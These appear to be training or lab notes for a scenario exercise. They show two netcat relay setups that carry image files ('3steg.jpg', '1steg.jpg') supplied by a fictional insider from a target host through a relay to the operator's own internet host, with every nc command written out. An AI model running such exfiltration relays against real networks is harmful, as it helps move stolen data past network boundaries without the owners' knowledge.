### ESTABLISHING A NETCAT RELAY *TO* "RELAY" and connect to this port and FORWARD TO "T1"
```bash
#ex: Donovian insider provided an image called 3steg.jpg on device "T2" that is listening for a connection from "RELAY" on TCP Port 6789 
#On RELAY:
nc 172.16.82.115 6789 > 3steg.jpg #This is T2 IP
#once verified 3steg.jpg is there, continue.
nc 10.10.0.40 3333 < 3steg.jpg #(This is us on our internet host IP, utilizing random ports)
#THEN ON OUR IP:
nc -lvp 3333 > glup.jpg
#Verify complete
```
### ESTABLISHING A NETCAT RELAY *ON* "RELAY", to ACCEPT THIS CONNECTION and forward to "T1"
```bash
#ex:  Donovian insider provided an image called 1steg.jpg on "T2" and is trying to connect to "RELAY" on TCP Port 1234 to send the file.
#On RELAY:
nc -lvp 1234 > 1steg.jpg
#verify file is there, then:
nc 10.10.0.40 1111 < 1steg.jpg #This is our internet host IP, utilizing random ports.)
#THEN ON OUR IP:
nc -lvp 1111 > meow.jpg
#Verify complete.
